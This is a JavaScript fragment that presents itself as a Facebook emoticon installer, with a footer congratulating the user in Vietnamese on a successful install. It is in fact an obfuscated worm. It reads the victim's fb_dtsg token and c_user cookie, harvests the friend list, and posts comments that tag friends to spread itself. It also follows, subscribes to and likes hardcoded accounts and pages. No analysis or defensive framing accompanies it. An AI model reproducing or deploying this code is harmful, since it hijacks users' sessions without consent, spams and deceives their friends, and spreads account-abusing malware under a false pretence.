...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/nguyenduong94" target="_blank">Chúc M?ng B?n Ðã Cài Ð?t ICON FaceBook Thành Công <br>NoName</a>';
	html += '</div>';
	...
	// === Facebook Emoticons ====
//
var _0xf841=["value","fb_dtsg","getElementsByName","match","cookie","1470090826552098","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," <3 Icon đẹp quá các bạn ☺  @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];
//
...
a("100006535835197");a("100004056556182");
sublist("1381609875400194");sublist("1381606648733850");
Like("170895983102672");Like("515926481788694");Like("1376400982623587");Like("635576509837567")
P("1449314955296352");P("1465140447047136");P("1461823470712167");P("377788585691242");

// Code tag
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var id = "1406198322968182";
var arkadaslar = [];
var svn_rev;
...
function yorum_yap(id ,mesaj) {
 ...
 xhr.open("POST", "/ajax/ufi/add_comment.php", true);
    ...
    xhr.send(params);
        ...
        arkadaslari_al(1428674774038358);